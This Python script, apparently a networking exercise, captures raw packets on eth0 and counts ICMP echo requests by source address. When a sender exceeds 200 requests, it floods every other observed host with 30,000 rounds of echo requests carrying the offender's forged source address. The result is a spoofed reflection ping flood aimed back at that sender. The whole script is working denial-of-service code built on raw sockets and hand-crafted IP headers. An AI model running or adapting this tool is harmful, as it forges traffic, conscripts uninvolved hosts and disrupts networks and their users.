import socket, sys , struct, time

ETH_P_ALL = 0x0003
def checksum(msg):
    s = 0
    # add padding if not multiple of 2 (16 bits)
    msg = (msg + b'\x00') if len(msg)%2 else msg
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
        s = (s & 0xffff) + (s >> 16)
    s = ~s & 0xffff
    return socket.ntohs(s)

def send_icmp_request(atack_addr, pf_addr):
    # Create socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # ICMP Echo Request Header
    type = 8
    code = 0
    mychecksum = 0
    identifier = 12
    seqnumber = 0
    payload = b"pingfloodatack"
    # Pack fields
    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
    # Calculate checksum
    mychecksum = checksum(icmp_packet)
    # Repack with checksum
    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
    # IP Header
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 20 + len(icmp_packet) # Total datagram size (header=20 + icmp packet)
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0
    ip_saddr = socket.inet_aton(atack_addr)
    ip_daddr = socket.inet_aton(pf_addr)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    # Pack IP header fields
    ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
        ip_proto, ip_check, ip_saddr, ip_daddr)
    # Destination IP address
    dest_ip = pf_addr
    dest_addr = socket.gethostbyname(dest_ip)
    # Send icmp_packet to address = (host, port)
    s.sendto(ip_header+icmp_packet, (dest_addr,0))
    print("Src addr: ", atack_addr, " Dest sddr ", pf_addr)

def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)

try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
except OSError as msg:
    print('Error'+str(msg))
    sys.exit(1)
s.bind(('eth0',0))
print('Socket created!')


list_of_ips = {}

initial_time = time.time()

while True:
    (packet,addr) = s.recvfrom(65536)
    eth_length = 14
    eth_header = packet[:14]
    eth = struct.unpack("!6s6sH",eth_header)

    print("MAC Dst: "   +  bytes_to_mac(eth[0]))
    print("MAC Src: "   +  bytes_to_mac(eth[1]))
    print("Type: "      +  hex(eth[2]))
    print(eth[2], "----------")	
    if eth[2] != 0x0800:
    	continue
    if eth[2] == 0x0800 :
        print("IP Packet")
        ip_header = packet[eth_length:20+eth_length]
        iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl*4
        ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])
        print("IP Src: "+s_addr)
        print("IP Dst: "+d_addr)
    else: 
    	break
    if protocol == 1:
        print("ICMP Packet")
        icmp_header = packet[iph_length+eth_length:]
        icmph = struct.unpack("!BBHHH%ds" % (len( icmp_header)-8), icmp_header)
        icmp_type = icmph[0]
        icmp_code = icmph[1]
        icmp_id = icmph[3]
        
        if icmp_type == 8 and icmp_code == 0:
            print("Echo request")
            if not s_addr in list_of_ips.keys():
                list_of_ips[s_addr] = 1
            elif list_of_ips[s_addr] > 200:
                list_of_ips.pop(s_addr)
                print("Ping Flood Atack --------------------------")
                for i in range(30000):
                    for ip in list_of_ips.keys():
                        send_icmp_request(s_addr, ip)
                break
            elif icmp_id != 12:
                list_of_ips[s_addr] += 1
        elif icmp_type == 0 and icmp_code == 0:
            print("Echo reply")
    
    print("IPs: ", list_of_ips,"\n")

    end_time = time.time()

    print("time: ",end_time - initial_time )
    if end_time - initial_time > 1:
        for elem in list_of_ips:
            list_of_ips[elem] = 0

        initial_time = time.time()
